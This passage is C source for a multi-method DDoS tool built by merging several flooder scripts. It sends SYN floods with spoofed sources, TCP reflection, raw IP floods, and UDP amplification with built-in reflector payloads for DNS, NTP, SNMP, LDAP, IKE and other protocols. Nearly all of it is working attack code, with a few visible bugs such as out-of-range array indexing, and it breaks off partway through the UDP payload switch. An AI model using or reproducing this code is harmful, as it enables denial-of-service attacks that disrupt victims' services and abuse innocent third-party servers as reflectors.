#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <math.h>
#include <pthread.h>
#include <signal.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <curl/curl.h>
#include <fcntl.h>
#include <sys/select.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <stdint.h>
#include <stdbool.h>
#include <errno.h>

// --- Constants ---
#define MAX_THREADS 4096
#define MAX_PACKET_SIZE 65535
#define PHI 0x9e3779b9
#define MAXTTL 255
#define BUFFER_SIZE 100

// --- Global State from ALL your files ---
volatile int running = 1;
volatile int limiter = 0;
volatile unsigned int pps = 0;
volatile unsigned int sleeptime = 100;
volatile unsigned int floodport = 0;
volatile long long total_success = 0;
volatile long long total_fail = 0;
volatile long long total_bytes = 0;
volatile unsigned long long cnt = 0;
volatile unsigned long long packet_count = 0;

int attack_duration = 30;
int max_connections = 100;
int num_workers = 50;
char target_host[256];
int target_port = 80;
char attack_mode[50];
char sourceip[17];
volatile unsigned int lenght_pkt = 0;

// --- CMWC PRNG from your files ---
static unsigned long int Q[8192];
static unsigned long int c = 362436;
static int cmwc_i = 4095;

void init_rand(unsigned long int x) {
    int i;
    Q[0] = x;
    Q[1] = x + PHI;
    Q[2] = x + PHI + PHI;
    for (i = 3; i < 4096; i++) {
        Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
    }
}

unsigned long int rand_cmwc(void) {
    unsigned long long int t, a = 18782LL;
    static unsigned long int i = 4095;
    unsigned long int x, r = 0xfffffffe;
    i = (i + 1) & 4095;
    t = a * Q[i] + c;
    c = (t >> 32);
    x = t + c;
    if (x < c) {
        x++;
        c++;
    }
    return (Q[i] = r - x);
}

int randnum(int min_num, int max_num) {
    int result = 0, low_num = 0, hi_num = 0;
    if (min_num < max_num) {
        low_num = min_num;
        hi_num = max_num + 1;
    } else {
        low_num = max_num + 1;
        hi_num = min_num;
    }
    result = (rand_cmwc() % (hi_num - low_num)) + low_num;
    return result;
}

// --- Checksum functions from your files ---
unsigned short csum(unsigned short *ptr, int nbytes) {
    register long sum;
    unsigned short oddbyte;
    short answer;
    sum = 0;
    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1) {
        oddbyte = 0;
        *((unsigned char*)&oddbyte) = *(unsigned char*)ptr;
        sum += oddbyte;
    }
    sum = (sum >> 16) + (sum & 0xffff);
    sum = sum + (sum >> 16);
    answer = (short)~sum;
    return (unsigned short)answer;
}

unsigned short checksum_tcp_packet(unsigned short *ptr, int nbytes) {
    register long sum;
    unsigned short oddbyte;
    register short answer;
    sum = 0;
    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1) {
        oddbyte = 0;
        *((unsigned char*)&oddbyte) = *(unsigned char*)ptr;
        sum += oddbyte;
    }
    sum = (sum >> 16) + (sum & 0xffff);
    sum = sum + (sum >> 16);
    answer = (short)~sum;
    return answer;
}

// --- TCP Checksum from NFO-TCP.c ---
unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph, int pipisize) {
    struct tcp_pseudo {
        unsigned long src_addr;
        unsigned long dst_addr;
        unsigned char zero;
        unsigned char proto;
        unsigned short length;
    } pseudohead;
    unsigned short total_len = iph->tot_len;
    pseudohead.src_addr = iph->saddr;
    pseudohead.dst_addr = iph->daddr;
    pseudohead.zero = 0;
    pseudohead.proto = IPPROTO_TCP;
    pseudohead.length = htons(sizeof(struct tcphdr) + pipisize);
    int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr) + pipisize;
    unsigned short *tcp = malloc(totaltcp_len);
    memcpy((unsigned char *)tcp, &pseudohead, sizeof(struct tcp_pseudo));
    memcpy((unsigned char *)tcp + sizeof(struct tcp_pseudo), (unsigned char *)tcph, sizeof(struct tcphdr) + pipisize);
    unsigned short output = csum(tcp, totaltcp_len);
    free(tcp);
    return output;
}

// --- UDP Checksum from UDP-BYPASS.c ---
unsigned short udpcsum(struct iphdr *iph, struct udphdr *udph) {
    struct udp_pseudo {
        unsigned long src_addr;
        unsigned long dst_addr;
        unsigned char zero;
        unsigned char proto;
        unsigned short length;
    } pseudohead;
    unsigned short total_len = iph->tot_len;
    pseudohead.src_addr = iph->saddr;
    pseudohead.dst_addr = iph->daddr;
    pseudohead.zero = 0;
    pseudohead.proto = IPPROTO_UDP;
    pseudohead.length = htons(sizeof(struct udphdr));
    int totaltudp_len = sizeof(struct udp_pseudo) + sizeof(struct udphdr);
    unsigned short *udp = malloc(totaltudp_len);
    memcpy((unsigned char *)udp, &pseudohead, sizeof(struct udp_pseudo));
    memcpy((unsigned char *)udp + sizeof(struct udp_pseudo), (unsigned char *)udph, sizeof(struct udphdr));
    unsigned short output = csum(udp, totaltudp_len);
    free(udp);
    return output;
}

// --- TCP Amplification structures from tcp-amp.c ---
struct list {
    struct sockaddr_in data;
    struct list *next;
    struct list *prev;
};
struct list *head = NULL;

struct thread_data { 
    int thread_id; 
    struct list *list_node; 
    struct sockaddr_in sin; 
};

// --- Random function from sybex.c ---
int randommexico(int min, int max) {
   static bool first = true;
   if (first) {  
      srand(time(NULL));
      first = false;
   }
   return min + rand() % (max + 1 - min);
}

// --- NFO-TCP Worker (COMPLETE from NFO-TCP.c) ---
void setup_ip_header(struct iphdr *iph) {
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + 24;
    iph->id = htonl(54321);
    iph->frag_off = htons(0x4000);
    iph->ttl = MAXTTL;
    iph->protocol = IPPROTO_TCP;
    iph->check = 0;
    iph->saddr = inet_addr("192.168.3.100");
}

void setup_tcp_header(struct tcphdr *tcph) {
    tcph->source = htons(5678);
    tcph->check = 0;
    memcpy((void *)tcph + sizeof(struct tcphdr), "\x02\x04\x05\x14\x01\x03\x03\x07\x01\x01\x08\x0a\x32\xb7\x31\x58\x00\x00\x00\x00\x04\x02\x00\x00", 24);
    tcph->syn = 1;
    tcph->window = htons(64240);
    tcph->doff = ((sizeof(struct tcphdr)) + 24)/4;
}

void* nfo_tcp_worker(void *par1) {
    char *td = (char *)par1;
    char datagram[MAX_PACKET_SIZE];
    struct iphdr *iph = (struct iphdr *)datagram;
    struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);
    struct sockaddr_in sin;
    
    sin.sin_family = AF_INET;
    sin.sin_port = htons(floodport);
    sin.sin_addr.s_addr = inet_addr(td);
    
    int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
    if(s < 0){
        fprintf(stderr, "Could not open raw socket.\n");
        return NULL;
    }
    
    memset(datagram, 0, MAX_PACKET_SIZE);
    setup_ip_header(iph);
    setup_tcp_header(tcph);
    
    tcph->dest = htons(floodport);
    iph->daddr = sin.sin_addr.s_addr;
    iph->check = csum((unsigned short *)datagram, iph->tot_len);
    
    int tmp = 1;
    const int *val = &tmp;
    if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof(tmp)) < 0){
        fprintf(stderr, "Error: setsockopt() - Cannot set HDRINCL!\n");
        close(s);
        return NULL;
    }
    
    init_rand(time(NULL));
    register unsigned int i = 0;
    
    int windows[11] = {29200, 64240, 65535, 32855, 18783, 30201, 35902, 28400, 8192, 6230, 65320};
    int mssvalues[9] = {20, 52, 160, 180, 172, 19, 109, 59, 113};
    
    while(running) {
        tcph->check = 0;
        tcph->seq = htonl(rand());
        tcph->doff = ((sizeof(struct tcphdr)) + 24)/4;
        tcph->dest = htons(floodport);
        
        iph->ttl = randnum(100, 130);
        iph->saddr = (rand_cmwc() >> 24 & 0xFF) << 24 | (rand_cmwc() >> 16 & 0xFF) << 16 | 
                     (rand_cmwc() >> 8 & 0xFF) << 8 | (rand_cmwc() & 0xFF);
        iph->id = htonl(rand_cmwc() & 0xFFFFFFFF);
        iph->check = csum((unsigned short *)datagram, iph->tot_len);
        
        tcph->source = htons(rand_cmwc() & 0xFFFF);
        tcph->dest = htons(floodport);
        tcph->check = tcpcsum(iph, tcph, 24);
        
        sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin));
        
        char stronka[] = "\x02\x04\x05\x14\x01\x03\x03\x07\x01\x01\x08\x0a\x32\xb7\x31\x58\x00\x00\x00\x00\x04\x02\x00\x00";
        stronka[3] = mssvalues[rand() % 9];
        stronka[7] = randnum(6, 11);
        stronka[12] = randnum(1, 250);
        stronka[13] = randnum(1, 250);
        stronka[14] = randnum(1, 250);
        stronka[15] = randnum(1, 250);
        
        tcph->window = htons(windows[rand() % 11]);
        const char *newpayload = stronka;
        memcpy((void *)tcph + sizeof(struct tcphdr), newpayload, 24);
        
        pps++;
        if(i >= limiter) {
            i = 0;
            usleep(sleeptime);
        }
        i++;
        
        __sync_fetch_and_add(&total_success, 1);
        __sync_fetch_and_add(&total_bytes, iph->tot_len);
    }
    
    close(s);
    return NULL;
}

// --- TCP Amplification Worker (COMPLETE from tcp-amp.c) ---
void setup_ip_header_amp(struct iphdr *iph) {
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
    iph->id = htonl(13373);
    iph->frag_off = 0;
    iph->ttl = MAXTTL;
    iph->protocol = IPPROTO_TCP;
    iph->check = 0;
    iph->saddr = inet_addr("192.168.3.100");
}

void setup_tcp_header_amp(struct tcphdr *tcph) {
    tcph->source = htons(5678);
    tcph->seq = rand();
    tcph->ack_seq = 0;
    tcph->res2 = 0;
    tcph->doff = 5;
    tcph->syn = 1;
    tcph->window = htonl(65535);
    tcph->check = 0;
    tcph->urg_ptr = 0;
}

unsigned short tcpcsum_amp(struct iphdr *iph, struct tcphdr *tcph) {
    struct tcp_pseudo {
        unsigned long src_addr;
        unsigned long dst_addr;
        unsigned char zero;
        unsigned char proto;
        unsigned short length;
    } pseudohead;
    unsigned short total_len = iph->tot_len;
    pseudohead.src_addr = iph->saddr;
    pseudohead.dst_addr = iph->daddr;
    pseudohead.zero = 0;
    pseudohead.proto = IPPROTO_TCP;
    pseudohead.length = htons(sizeof(struct tcphdr));
    int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr);
    unsigned short *tcp = malloc(totaltcp_len);
    memcpy((unsigned char *)tcp, &pseudohead, sizeof(struct tcp_pseudo));
    memcpy((unsigned char *)tcp + sizeof(struct tcp_pseudo), (unsigned char *)tcph, sizeof(struct tcphdr));
    unsigned short output = csum(tcp, totaltcp_len);
    free(tcp);
    return output;
}

void* tcp_amp_worker(void *par1) {
    struct thread_data *td = (struct thread_data *)par1;
    char datagram[MAX_PACKET_SIZE];
    struct iphdr *iph = (struct iphdr *)datagram;
    struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);
    struct sockaddr_in sin = td->sin;
    struct list *list_node = td->list_node;
    
    int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
    if(s < 0){
        fprintf(stderr, "Could not open raw socket.\n");
        return NULL;
    }
    
    init_rand(time(NULL));
    memset(datagram, 0, MAX_PACKET_SIZE);
    setup_ip_header_amp(iph);
    setup_tcp_header_amp(tcph);
    
    tcph->source = sin.sin_port;
    tcph->dest = list_node->data.sin_port;
    iph->saddr = sin.sin_addr.s_addr;
    iph->daddr = list_node->data.sin_addr.s_addr;
    iph->check = csum((unsigned short *)datagram, iph->tot_len);
    
    int tmp = 1;
    if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof(tmp)) < 0){
        fprintf(stderr, "Error: setsockopt() - Cannot set HDRINCL!\n");
        close(s);
        return NULL;
    }
    
    register unsigned int pmk = 0;
    
    while(running) {
        if(pmk % 2) {
            iph->saddr = sin.sin_addr.s_addr;
            iph->daddr = list_node->data.sin_addr.s_addr;
            iph->id = htonl(rand_cmwc() & 0xFFFFFF);
            iph->check = csum((unsigned short *)datagram, iph->tot_len);
            tcph->dest = list_node->data.sin_port;
            tcph->seq = rand_cmwc() & 0xFFFF;
            tcph->check = 0;
            tcph->check = tcpcsum_amp(iph, tcph);
            sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&list_node->data, sizeof(list_node->data));
            list_node = list_node->next;
        } else {
            iph->saddr = list_node->data.sin_addr.s_addr;
            iph->daddr = sin.sin_addr.s_addr;
            iph->id = htonl(rand_cmwc() & 0xFFFFFF);
            iph->check = csum((unsigned short *)datagram, iph->tot_len);
            tcph->seq = rand_cmwc() & 0xFFFF;
            tcph->source = list_node->data.sin_port;
            tcph->dest = sin.sin_port;
            tcph->check = 0;
            tcph->check = tcpcsum_amp(iph, tcph);
            sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin));
        }
        pmk++;
        usleep(0);
        
        __sync_fetch_and_add(&total_success, 1);
        __sync_fetch_and_add(&total_bytes, iph->tot_len);
    }
    
    close(s);
    return NULL;
}

// --- Sybex Worker (COMPLETE from sybex.c) ---
void* sybex_worker(void *par1) {
    char *targettr = (char *)par1;
    char datagram[4096], source_ip[32], *data, *pseudogram;
    memset(datagram, 0, 4096);
    
    struct iphdr *iph = (struct iphdr *)datagram;
    struct tcphdr *tcph = (struct tcphdr *)(datagram + sizeof(struct iphdr));
    struct sockaddr_in sin;
    struct pseudo_header {
        u_int32_t source_address;
        u_int32_t dest_address;
        u_int8_t placeholder;
        u_int8_t protocol;
        u_int16_t tcp_length;
        struct tcphdr tcp;
    } psh;
    
    data = datagram + sizeof(struct iphdr) + sizeof(struct tcphdr);
    if (lenght_pkt == 0) {
        data = "";
    }
    
    sin.sin_family = AF_INET;
    int rdzeroport;
    
    if (floodport == 0) {
        rdzeroport = randommexico(2, 65535);
        sin.sin_port = htons(rdzeroport);
        tcph->dest = htons(rdzeroport);
    } else {
        sin.sin_port = htons(floodport);
        tcph->dest = htons(floodport);
    }
    
    sin.sin_addr.s_addr = inet_addr(targettr);
    
    int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
    if(s == -1) {
        perror("[!] For use Script you need root stupid...");
        return NULL;
    }
    
    while(running) {
        char primera[20];
        int one_r = randommexico(1, 250);
        int two_r = randommexico(1, 250);
        int three_r = randommexico(1, 250);
        int four_r = randommexico(1, 250);
        snprintf(primera, sizeof(primera)-1, "%d.%d.%d.%d", one_r, two_r, three_r, four_r);
        snprintf(sourceip, sizeof(sourceip)-1, primera);
        strcpy(source_ip, sourceip);
        
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + strlen(data);
        iph->id = htons(1);
        iph->frag_off = 0;
        iph->ttl = 64;
        iph->protocol = IPPROTO_TCP;
        iph->check = 0;
        iph->saddr = inet_addr(source_ip);
        iph->daddr = sin.sin_addr.s_addr;
        iph->check = checksum_tcp_packet((unsigned short *)datagram, iph->tot_len);
        
        int randSeq = randommexico(10000, 99999);
        int randAckSeq = randommexico(10000, 99999);
        int randSP = randommexico(2, 65535);
        int randWin = randommexico(1000, 9999);
        
        tcph->source = htons(randSP);
        tcph->seq = htonl(randSeq);
        tcph->ack_seq = 0;
        tcph->doff = 5;
        tcph->fin = 0;
        tcph->syn = 1;
        tcph->rst = 0;
        tcph->psh = 0;
        tcph->ack = 0;
        tcph->urg = 0;
        tcph->window = htons(randWin);
        tcph->check = 0;
        tcph->urg_ptr = 0;
        
        psh.source_address = inet_addr(source_ip);
        psh.dest_address = sin.sin_addr.s_addr;
        psh.placeholder = 0;
        psh.protocol = IPPROTO_TCP;
        psh.tcp_length = htons(sizeof(struct tcphdr) + strlen(data));
        
        int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr) + strlen(data);
        pseudogram = malloc(psize);
        memcpy(pseudogram, (char*)&psh, sizeof(struct pseudo_header));
        memcpy(pseudogram + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr) + strlen(data));
        tcph->check = checksum_tcp_packet((unsigned short*)pseudogram, psize);
        free(pseudogram);
        
        int one = 1;
        const int *val = &one;
        setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof(one));
        
        if(sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
            printf("[!] Error sending Packet!\n");
        } else {
            __sync_fetch_and_add(&total_success, 1);
            __sync_fetch_and_add(&total_bytes, iph->tot_len);
        }
    }
    
    close(s);
    return NULL;
}

// --- LOL Worker (COMPLETE from lol.c) ---
char tip[64];
int tport;
char lip[64];

int glip(const char *t, char *l, int ln) {
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if(s < 0) return -1;
    struct sockaddr_in a = {0};
    a.sin_family = AF_INET;
    a.sin_port = htons(53);
    if(inet_pton(AF_INET, t, &a.sin_addr) <= 0) {
        close(s);
        return -1;
    }
    if(connect(s, (struct sockaddr*)&a, sizeof(a)) < 0) {
        close(s);
        return -1;
    }
    struct sockaddr_in n;
    socklen_t nl = sizeof(n);
    if(getsockname(s, (struct sockaddr*)&n, &nl) < 0) {
        close(s);
        return -1;
    }
    if(!inet_ntop(AF_INET, &n.sin_addr, l, ln)) {
        close(s);
        return -1;
    }
    close(s);
    return 0;
}

#define PSZ 32

void* lol_worker(void *_) {
    int sz = sizeof(struct iphdr) + PSZ;
    char *p = malloc(sz);
    if(!p) return NULL;
    
    struct iphdr *ip = (void*)p;
    struct sockaddr_in sa = {0};
    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = inet_addr(tip);
    
    int s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if(s < 0) {
        free(p);
        return NULL;
    }
    int o = 1;
    setsockopt(s, IPPROTO_IP, IP_HDRINCL, &o, sizeof(o));
    
    srand(time(NULL) ^ pthread_self());
    
    while(running) {
        memset(p, 0, sz);
        ip->ihl = 5;
        ip->version = 4;
        ip->tot_len = htons(sz);
        ip->id = htons(rand() % 65535);
        ip->ttl = 64;
        ip->protocol = 0;
        ip->saddr = inet_addr(lip);
        ip->daddr = sa.sin_addr.s_addr;
        
        p[sizeof(struct iphdr)] = (tport >> 8) & 0xFF;
        p[sizeof(struct iphdr) + 1] = tport & 0xFF;
        for(int i = 2; i < PSZ; i++) {
            p[sizeof(struct iphdr) + i] = rand() % 256;
        }
        
        ip->check = 0;
        ip->check = csum((unsigned short*)p, sizeof(struct iphdr) / 2);
        
        if(sendto(s, p, sz, 0, (struct sockaddr*)&sa, sizeof(sa)) < 0) break;
        
        __sync_fetch_and_add(&cnt, 1);
        __sync_fetch_and_add(&total_success, 1);
        __sync_fetch_and_add(&total_bytes, sz);
    }
    
    close(s);
    free(p);
    return NULL;
}

// --- Empty IP Flood Worker (COMPLETE from empty_ip_flood.c) ---
void* empty_ip_flood_worker(void* arg) {
    char packet[20];
    struct iphdr *iph = (struct iphdr *)packet;
    
    int s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if(s < 0) {
        perror("Socket creation failed");
        return NULL;
    }
    
    int one = 1;
    setsockopt(s, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
    
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_addr.s_addr = inet_addr("1.1.1.1"); // Target IP
    
    memset(packet, 0, sizeof(packet));
    
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = htons(sizeof(struct iphdr));
    iph->id = htons(rand() % 65535);
    iph->frag_off = 0;
    iph->ttl = 64;
    iph->protocol = 0;
    iph->saddr = inet_addr("8.8.8.8"); // Source IP
    iph->daddr = sin.sin_addr.s_addr;
    iph->check = csum((unsigned short *)packet, sizeof(struct iphdr) / 2);
    
    while(running) {
        sendto(s, packet, sizeof(struct iphdr), 0, (struct sockaddr *)&sin, sizeof(sin));
        __sync_fetch_and_add(&packet_count, 1);
        __sync_fetch_and_add(&total_success, 1);
        __sync_fetch_and_add(&total_bytes, sizeof(struct iphdr));
    }
    
    close(s);
    return NULL;
}

// --- UDP Bypass Worker (COMPLETE from UDP-BYPASS.c) ---
void setup_ip_header_udp(struct iphdr *iph) {
    char ip[17];
    snprintf(ip, sizeof(ip)-1, "%d.%d.%d.%d", rand()%255, rand()%255, rand()%255, rand()%255);
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->id = htonl(rand()%54321);
    iph->frag_off = 0;
    iph->ttl = MAXTTL;
    iph->protocol = IPPROTO_UDP;
    iph->check = 0;
    iph->saddr = inet_addr(ip);
}

void vulnMix(struct iphdr *iph, struct udphdr *udph) {
    int protocol[] = {7, 53, 111, 123, 137, 138, 161, 177, 389, 427, 500, 520, 623, 626, 1194, 1434, 1604, 1900, 5353, 8797, 9987};
    char *hexa[] = {
        "\x00","\x01","\x02","\x03","\x04","\x05","\x06","\x07","\x08","\x09","\x0a","\x0b","\x0c","\x0d","\x0e","\x0f",
        "\x10","\x11","\x12","\x13","\x14","\x15","\x16","\x17","\x18","\x19","\x1a","\x1b","\x1c","\x1d","\x1e","\x1f",
        "\x20","\x21","\x22","\x23","\x24","\x25","\x26","\x27","\x28","\x29","\x2a","\x2b","\x2c","\x2d","\x2e","\x2f",
        "\x30","\x31","\x32","\x33","\x34","\x35","\x36","\x37","\x38","\x39","\x3a","\x3b","\x3c","\x3d","\x3e","\x3f",
        "\x40","\x41","\x42","\x43","\x44","\x45","\x46","\x47","\x48","\x49","\x4a","\x4b","\x4c","\x4d","\x4e","\x4f",
        "\x50","\x51","\x52","\x53","\x54","\x55","\x56","\x57","\x58","\x59","\x5a","\x5b","\x5c","\x5d","\x5e","\x5f",
        "\x60","\x61","\x62","\x63","\x64","\x65","\x66","\x67","\x68","\x69","\x6a","\x6b","\x6c","\x6d","\x6e","\x6f",
        "\x70","\x71","\x72","\x73","\x74","\x75","\x76","\x77","\x78","\x79","\x7a","\x7b","\x7c","\x7d","\x7e","\x7f",
        "\x80","\x81","\x82","\x83","\x84","\x85","\x86","\x87","\x88","\x89","\x8a","\x8b","\x8c","\x8d","\x8e","\x8f",
        "\x90","\x91","\x92","\x93","\x94","\x95","\x96","\x97","\x98","\x99","\x9a","\x9b","\x9c","\x9d","\x9e","\x9f",
        "\xa0","\xa1","\xa2","\xa3","\xa4","\xa5","\xa6","\xa7","\xa8","\xa9","\xaa","\xab","\xac","\xad","\xae","\xaf",
        "\xb0","\xb1","\xb2","\xb3","\xb4","\xb5","\xb6","\xb7","\xb8","\xb9","\xba","\xbb","\xbc","\xbd","\xbe","\xbf",
        "\xc0","\xc1","\xc2","\xc3","\xc4", // --- UDP Bypass Worker (CONTINUED) ---
        "\xc5","\xc6","\xc7","\xc8","\xc9","\xca","\xcb","\xcc","\xcd","\xce","\xcf",
        "\xd0","\xd1","\xd2","\xd3","\xd4","\xd5","\xd6","\xd7","\xd8","\xd9","\xda",
        "\xdb","\xdc","\xdd","\xde","\xdf","\xe0","\xe1","\xe2","\xe3","\xe4","\xe5",
        "\xe6","\xe7","\xe8","\xe9","\xea","\xeb","\xec","\xed","\xee","\xef","\xf0",
        "\xf1","\xf2","\xf3","\xf4","\xf5","\xf6","\xf7","\xf8","\xf9","\xfa","\xfb",
        "\xfc","\xfd","\xfe","\xff"
    };
    char *getPayload = hexa[rand()%253];
    switch(protocol[rand()%22]) {
        case 53:
            memcpy((void *)udph + sizeof(struct udphdr), "%getPayload%getPayload\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03\x77\x77\x77\x06\x67\x6f\x6f\x67\x6c\x65\x03\x63\x6f\x6d\x00\x00\x01\x00\x01", 32);
            udph->len = htons(sizeof(struct udphdr) + 32);
            udph->dest = htons(53);
            iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 32;
            break;
        case 7:
            memcpy((void *)udph + sizeof(struct udphdr), "\x0D\x0A\x0D\x0A", 4);
            udph->len = htons(sizeof(struct udphdr) + 4);
            udph->dest = htons(7);
            iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 4;
            break;
        case 111:
            memcpy((void *)udph + sizeof(struct udphdr), "\x72\xFE\x1D\x13\x00\x00\x00\x00\x00\x00\x00\x02\x00\x01\x86\xA0\x00\x01\x97\x7C\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", 40);
            udph->len = htons(sizeof(struct udphdr) + 40);
            udph->dest = htons(111);
            iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 40;
            break;
        case 123:
            memcpy((void *)udph + sizeof(struct udphdr), "\xd9\x00\x0a\xfa\x00\x00\x00\x00\x00\x01\x02\x90\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc5\x02\x04\xec\xec\x42\xee\x92", 48);
            udph->len = htons(sizeof(struct udphdr) + 48);
            udph->dest = htons(123);
            iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 48;
            break;
        case 137:
            memcpy((void *)udph + sizeof(struct udphdr), "\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03\x77\x77\x77\x06\x67\x6f\x6f\x67\x6c\x65\x03\x63\x6f\x6d\x00\x00\x05\x00\x01", 30);
            udph->len = htons(sizeof(struct udphdr) + 30);
            udph->dest = htons(137);
            iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 30;
            break;
        case 138:
            memcpy((void *)udph + sizeof(struct udphdr), "%getPayload%getPayload%getPayload%getPayload%getPayload%getPayload%getPayload%getPayload%getPayload%getPayload%getPayload%getPayload%getPayload", 14);
            udph->len = htons(sizeof(struct udphdr) + 14);
            udph->dest = htons(138);
            iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 14;
            break;
        case 161:
            memcpy((void *)udph + sizeof(struct udphdr), "\x30\x3A\x02\x01\x03\x30\x0F\x02\x02\x4A\x69\x02\x03\x00\xFF\xE3\x04\x01\x04\x02\x01\x03\x04\x10\x30\x0E\x04\x00\x02\x01\x00\x02\x01\x00\x04\x00\x04\x00\x04\x00\x30\x12\x04\x00\x04\x00\xA0\x0C\x02\x02\x37\xF0\x02\x01\x00\x02\x01\x00\x30\x00", 60);
            udph->len = htons(sizeof(struct udphdr) + 60);
            udph->dest = htons(161);
            iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 60;
            break;
        case 177:
            memcpy((void *)udph + sizeof(struct udphdr), "\x00\x01\x00\x02\x00\x01\x00", 7);
            udph->len = htons(sizeof(struct udphdr) + 7);
            udph->dest = htons(177);
            iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 7;
            break;
        case 389:
            memcpy((void *)udph + sizeof(struct udphdr), "\x30\x84\x00\x00\x00\x2d\x02\x01\x07\x63\x84\x00\x00\x00\x24\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x64\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x43\x6c\x61\x73\x73\x30\x84\x00\x00\x00\x00", 51);
            udph->len = htons(sizeof(struct udphdr) + 51);
            udph->dest = htons(389);
            iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 51;
            break;
        case 427:
            strcpy((void *)udph + sizeof(struct udphdr), "\x02\x01\x00\x006\x00\x00\x00\x00\x00\x01\x00\x02en\x00\x00\x00\x15""service:service-agent""\x00\x07""default""\x00\x00\x00\x00");
            udph->len = htons(sizeof(struct udphdr) + 22);
            udph->dest = htons(427);
            iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 22;
            break;
        case 500:
            memcpy((void *)udph + sizeof(struct udphdr), "\x00\x11\x22\x33\x44\x55\x66\x77\x00\x00\x00\x00\x00\x00\x00\x00\x01\x10\x02\x00\x00\x00\x00\x00\x00\x00\x00\xC0\x00\x00\x00\xA4\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x98\x01\x01\x00\x04\x03\x00\x00\x24\x01\x01\x00\x00\x80\x01\x00\x05\x80\x02\x00\x02\x80\x03\x00\x01\x80\x04\x00\x02\x80\x0B\x00\x01\x00\x0C\x00\x04\x00\x00\x00\x01\x03\x00\x00\x24\x02\x01\x00\x00\x80\x01\x00\x05\x80\x02\x00\x01\x80\x03\x00\x01\x80\x04\x00\x02\x80\x0B\x00\x01\x00\x0C\x00\x04\x00\x00\x00\x01\x03\x00\x00\x24\x03\x01\x00\x00\x80\x01\x00\x01\x80\x02\x00\x02\x80\x03\x00\x01\x80\x04\x00\x02\x80\x0B\x00\x01\x00\x0C\x00\x04\x00\x00\x00\x01", 153);
            udph->len = htons(sizeof(struct udphdr) + 153);
            udph->dest = htons(500);
            iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 153;
            break;
        case 520:
            memcpy((void *)udph + sizeof(struct udphdr), "\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10", 24);
            udph->len = htons(sizeof(struct udphdr) + 24);
            udph->dest = htons(520);
            iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 24;
            break;
        case 623:
            memcpy((void *)udph + sizeof(struct udphdr), "\x06\x00\xff\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x09\x20\x18\xc8\x81\x00\x38\x8e\x04\xb5", 23);
            udph->len = htons(sizeof(struct udphdr) + 23);
            udph->dest = htons(623);
            iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 23;
            break;
        case 626:
            strcpy((void *)udph + sizeof(struct udphdr), "SNQUERY: 127.0.0.1:AAAAAA:xsvr");
            udph->len = htons(sizeof(struct udphdr) + 30);
            udph->dest = htons(626);
